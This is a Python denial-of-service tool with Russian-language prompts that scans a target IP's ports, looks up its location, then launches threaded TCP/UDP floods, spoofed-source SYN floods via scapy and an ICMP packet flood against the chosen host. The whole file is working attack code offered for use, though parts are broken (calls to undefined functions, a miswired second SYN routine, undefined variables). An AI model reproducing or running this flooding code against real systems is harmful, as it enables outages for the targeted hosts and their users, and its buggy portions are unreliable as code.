import math
import random
import time
import urllib.request
import requests
import json
import sys
import os
from threading import Thread
import socket
from requests.exceptions import HTTPError
import random
from datetime import datetime
import sys
from os import system
from sys import stdout
from scapy.all import *
from random import randint
import socks
import time
import random
import random
from socket import *
import socket
import threading
from scapy.all import IP, TCP, send, Raw
from threading import Thread
try:
	import tools.randomData as randomData
except ImportError:
	pass

try:
	os.remove("packets")
except:
	pass

#os.startfile('UCF 1.7.exe','runas')

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#threads = int(5500)

filename = "packets"

mas = [20, 21, 22, 23, 25, 42, 43, 53, 67, 69, 80, 110, 115, 123, 137, 138, 139, 143, 161, 179, 443, 445, 514, 515, 993, 995, 1080, 1194, 1337, 1702, 19132, 19133, 19134, 19135, 19136, 19137, 19138, 1723, 3128, 3268, 3306, 3066, 3389, 5432, 5060, 5900, 5938, 8080, 10000, 20000]

host = str(input("Введите IP: "))
scan = input("Просканировать порты? (y/n) ")

if scan == "y":
	for port1 in mas:
		s = socket.socket()
		s.settimeout(1)
		try:
			s.connect((host, port1))
		except socket.error:
			pass
		else:
			s.close
			print ("[+] " + host + ': ' + str(port1) + ' Открыт')
if scan == "n":
	pass

port = int(input("[SYN] Введите PORT: "))
port2 = int(input("Введите PORT2: "))
pod = input("Использовать атаку POD? (y/n) ")

fake_ip = '182.21.20.32'
Packets1 = 9000000

ip = host
getIP = host
url = "https://ipinfo.io/" + getIP + "/json"

print("Получение информации...")
try:
	getInfo = urllib.request.urlopen( url )
	infoList = json.load(getInfo)
	print( "-" * 60 )
	print( "IP: ", infoList["ip"] )
	print( "Город: ", infoList["city"] )
	print( "Регион: ", infoList["region"] )
	print( "Страна: ", infoList["country"] )
	print( "-" * 60 )
	ip,port = info()
	th2 = threading.Thread(target = gain)
	th2.start()
except urllib.error.HTTPError:
	print( "-" * 60 )
	print( "IP не был найден!" )
	print( "-" * 60 )
	exit()
except:
	pass

def whoisIPinfo(ip):
	myComand = "whois " + getIP
	whoisInfo = os.popen( myComand ).read()
	return whoisInfo

times = int(input(" Количество отправки пакетов, при подключении: "))
threads = int(input(" Потоков: "))

if threads > 100000:
	print("[!] Максимальное поличество потоков: 100.000, автоматически установлено 100.000.")
	threads = 100000

choice = str(input(" Начать атаку (y/n): "))
if pod == "y" and choice == "y":
	try:
		print("[?] Подготовка к атаке, генерация пакетов")
		#os.remove("packets")
		time = 0.00114108 * times  + 0.157758
		minutes = time/60
		pkgs = [IP(dst=host)/ICMP() for i in range (times)]
		wrpcap(filename, pkgs)
	except:
		pass

def POD():
	pkgs1 = rdpcap(filename)
	try:
		print('[POD] %s пакетов.' % (len(pkgs1)))
		sendpfast(pkgs1)
		print('[POD] Завершено, %s из %s' % ((y+1), times))
	except:
		pass

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x

def run():
	data = random._urandom(1024)
	data1 = random._urandom(2048)
	payload1 = random._urandom(random.randint(1, 120))
	#i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((ip, port))
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip, port))
			addr = (str(ip),int(port))
			for x in range(times):
				print("[TCP/UDP] Отправлено!")
				#payload = random._urandom(random.randint(1, 120))
				sock.send(payload)
				sock.send(data1)
				s.sendto(data,addr)
				sock.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
				sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
				s.sendto(data,addr)
				s.sendto(data1)
				sock.send(data)
				s.sendto(data,addr)		
				sock.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
				sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
				s.sendto(data,addr)
				sock.send(data)
				sock.send(data)
		except ConnectionAbortedError:
			pass
		except:
			#sock.close()
			#dos.close()
			print("[TCP/UDP] Ошибка! Возможно хост перестал отвечать на запросы.")

def run2():
	data = random._urandom(1024)
	data1 = random._urandom(2048)
	payload1 = random._urandom(random.randint(1, 120))
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock1.connect((ip, port))
			s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s1.connect((ip, port))
			addr1 = (str(ip),int(port2))
			for w in range(times):
				sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock1.connect((ip, port2))
				s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				s1.connect((ip, port2))
				print("[TCP/UDP] Отправлено!")
				sock1.send(payload1)
				sock1.send(data1,addr1)
				s1.sendto(data,addr1)		
				sock1.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port2))
				sock1.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port2))
				s1.sendto(data,addr1)
				s1.sendto(data1)
				sock1.send(data)
				s1.sendto(data,addr1)		
				sock1.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port2))
				sock1.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port2))
				s1.sendto(data,addr1)
				sock1.send(data)
				sock1.send(data1)
		except ConnectionAbortedError:
			pass
		except:
			#sock.close()
			#dos.close()
			print("[TCP/UDP] Ошибка! Возможно хост перестал отвечать на запросы.")

def gain():
	payload = random._urandom(random.randint(1, 120))
	data = random._urandom(1024)
	data1 = random._urandom(2048)
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((ip, port))
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip, port))
			addr = (str(ip),int(port))
			print("[TCP/UDP] Отправлено!")
			sock.send(payload)
			sock.send(data1,addr)
			s.sendto(data,addr)		
			sock.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port2))
			sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port2))
			s.sendto(data,addr)
			s.sendto(data1)
			sock.send(data)
			s.sendto(data,addr)		
			sock.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port2))
			sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port2))
			s.sendto(data,addr)
			sock.send(data)
			s.send(data1)
		except ConnectionAbortedError:
			pass
		except:
			print("[TCP/UDP] Ошибка! Возможно хост перестал отвечать на запросы.")

def SYN_Flood():
	total = 0
	#print("[?] Отправка пакетов")
	for e in range (0,Packets1):
		try:
			print("[SYN] Отправлено!")
			s_port = randInt()
			s_eq = randInt()
			w_indow = randInt()
			IP_Packet = IP ()
			IP_Packet.src = randomIP()
			IP_Packet.dst = ip
			TCP_Packet = TCP ()
			TCP_Packet.sport = s_port
			TCP_Packet.dport = port
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow
			send(IP_Packet/TCP_Packet, verbose=0)
			total+=1
		except AttributeError:
			pass
		except:
			print("[SYN] Ошибка! Возможно хост перестал отвечать на запросы.")

def SYN_Flood2():
	total = 0
	#print("[?] Отправка пакетов")
	for e in range (0,Packets1):
		try:
			print("[SYN] Отправлено!")
			s_port1 = randInt()
			s_eq1 = randInt()
			w_indow1 = randInt()
			IP_Packet1 = IP ()
			IP_Packet.src1 = randomIP()
			IP_Packet.dst1 = ip
			TCP_Packet1 = TCP ()
			TCP_Packet.sport1 = s_port1
			TCP_Packet.dport1 = port2
			TCP_Packet.flags1 = "S"
			TCP_Packet.seq1 = s_eq1
			TCP_Packet.window1 = w_indow1
			send(IP_Packet1/TCP_Packet1, verbose=0)
			total+=1
		except AttributeError:
			pass
		except:
			print("[SYN] Ошибка! Возможно хост перестал отвечать на запросы.")

for o in range(threads):
	try:
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
			th3 = threading.Thread(target = SYN_Flood)
			th3.start()
			th6 = threading.Thread(target = SYN_Flood2)
			th6.start()
			th5 = threading.Thread(target = run1)
			th5.start()
			#th4 = threading.Thread(target = POD)
			#th4.start()
		else:
			print("[UCF] Script Stopped")
			exit()
	except:
		pass
